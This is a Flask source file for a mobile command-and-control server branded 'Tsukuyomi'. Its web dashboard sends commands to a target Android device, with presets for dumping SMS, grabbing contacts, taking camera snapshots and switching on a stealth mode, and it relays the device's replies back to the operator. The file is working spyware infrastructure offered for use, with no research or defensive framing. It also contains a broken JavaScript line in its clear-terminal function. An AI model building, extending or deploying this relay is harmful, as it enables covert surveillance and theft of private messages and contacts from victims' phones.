from flask import Flask, jsonify, request

app = Flask(__name__)

current_command = ""
latest_response = "Waiting for target connection..."

# Complete Ultimate C2 Dashboard UI (Tailwind CSS + Dark Theme)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tsukuyomi Mobile C2 Command Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; }
        .glass-panel { background: rgba(18, 24, 36, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        @keyframes pulse-fast { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.95); } }
        .pulse-live { animation: pulse-fast 1.5s infinite ease-in-out; }
    </style>
</head>
<body class="min-h-screen p-4 flex flex-col items-center justify-start">
    <div class="w-full max-w-3xl glass-panel p-6 rounded-2xl space-y-6 shadow-2xl mt-6">
        <!-- Header -->
        <div class="flex justify-between items-center border-b border-slate-800 pb-4">
            <div class="flex items-center space-x-3">
                <div class="w-3.5 h-3.5 bg-green-400 rounded-full pulse-live"></div>
                <h1 class="text-base font-bold font-mono text-cyan-400 tracking-wider">TSUKUYOMI C2 COMMAND CENTER</h1>
            </div>
            <div class="flex items-center space-x-2">
                <span class="px-2.5 py-1 bg-cyan-500/10 text-cyan-400 text-xs font-mono rounded border border-cyan-500/30">RELAY ACTIVE</span>
                <button onclick="clearTerminal()" class="px-3 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-mono rounded transition">Clear Logs</button>
            </div>
        </div>
        
        <!-- Command Input Section -->
        <div class="space-y-3 font-mono text-sm">
            <label class="text-slate-400 text-xs uppercase tracking-wider flex items-center justify-between">
                <span>Command Dispatcher</span>
                <span class="text-slate-500 text-[10px]">Target: Android Device</span>
            </label>
            <div class="flex space-x-2">
                <input type="text" id="cmdInput" placeholder="Enter command (e.g., GET_CONTACTS, SNAP_CAM, STEALTH_ON)..." class="flex-1 bg-slate-900 border border-slate-700 px-4 py-3 rounded-xl text-white focus:outline-none focus:border-cyan-400 text-xs font-mono">
                <button onclick="sendCommand()" class="px-6 py-3 bg-cyan-400 text-slate-950 font-bold rounded-xl hover:bg-cyan-300 transition text-xs flex items-center space-x-2">
                    <i class="fa-solid fa-paper-plane"></i>
                    <span>DISPATCH</span>
                </button>
            </div>
        </div>

        <!-- Quick Action Buttons -->
        <div class="space-y-2 font-mono">
            <span class="text-xs text-slate-400 uppercase tracking-wider">Quick Payload Presets:</span>
            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2">
                <button onclick="quickCmd('PING')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-xl text-xs text-cyan-300 transition text-left font-mono">⚡ PING</button>
                <button onclick="quickCmd('GET_BATTERY')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-xl text-xs text-cyan-300 transition text-left font-mono">🔋 Battery Info</button>
                <button onclick="quickCmd('STEALTH_ON')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-xl text-xs text-amber-400 transition text-left font-mono">🥷 Stealth ON</button>
                <button onclick="quickCmd('DUMP_SMS')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-xl text-xs text-rose-400 transition text-left font-mono">📨 Dump SMS</button>
            </div>
        </div>

        <!-- Live Response Terminal -->
        <div class="space-y-2 font-mono">
            <div class="flex justify-between items-center">
                <span class="text-xs text-slate-400 uppercase tracking-wider">Live Response Terminal:</span>
                <span id="pollStatus" class="text-[10px] text-green-400 animate-pulse">● Polling Active (3s)</span>
            </div>
            <div id="responseBox" class="h-64 bg-slate-950 p-4 rounded-xl border border-slate-800 text-xs text-green-400 overflow-y-auto space-y-1.5 shadow-inner">
                <p class="text-slate-500">[SYSTEM] Initialized Tsukuyomi Relay Engine...</p>
                <p class="text-slate-500">[SYSTEM] Waiting for target polling connection...</p>
            </div>
        </div>
    </div>

    <script>
        window.lastResp = "";

        function quickCmd(cmdText) {
            document.getElementById('cmdInput').value = cmdText;
            sendCommand();
        }

        async function sendCommand() {
            const input = document.getElementById('cmdInput');
            const cmd = input.value.trim();
            if(!cmd) return;
            
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: cmd })
                });
                const data = await res.json();
                addLog(`[DISPATCHED] -> ${data.command}`, 'text-cyan-400 font-semibold');
                input.value = '';
            } catch(e) {
                addLog(`[ERROR] Failed to dispatch command to relay`, 'text-red-400');
            }
        }

        async function pollResponse() {
            try {
                const res = await fetch('/api/response');
                const data = await res.json();
                if(data.response && data.response !== window.lastResp) {
                    window.lastResp = data.response;
                    addLog(`[TARGET RESPONSE] ${data.response}`, 'text-green-400 font-mono');
                }
            } catch(e) {
                // Silent catch for polling drops
            }
        }
        setInterval(pollResponse, 3000);

        function addLog(text, colorClass) {
            const box = document.getElementById('responseBox');
            const timeStr = new Date().toLocaleTimeString();
            box.innerHTML += `<p class="${colorClass}"><span class="text-slate-600">[${timeStr}]</span> ${text}</p>`;
            box.scrollTop = box.scrollHeight;
        }

        function clearTerminal() {
            document.getElementById('responseBox.innerHTML = '<p class="text-slate-500">[SYSTEM] Terminal cleared.</p>';
        }
    </script>
</body>
</html>
"""


@app.route("/")
def home():
  return HTML_TEMPLATE


@app.route("/api/command", methods=["GET", "POST"])
def handle_command():
  global current_command
  if request.method == "POST":
    data = request.get_json() or {}
    current_command = data.get("command", "")
    return jsonify({"status": "success", "command": current_command})
  # Target app fetches the pending command via GET
  cmd = current_command
  current_command = ""  # Clear command after delivery
  return jsonify({"command": cmd})


@app.route("/api/response", methods=["GET", "POST"])
def handle_response():
  global latest_response
  if request.method == "POST":
    data = request.get_json() or {}
    latest_response = data.get("response", "")
    return jsonify({"status": "success"})
  # Dashboard fetches latest target response via GET
  return jsonify({"response": latest_response})


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=5000)
  
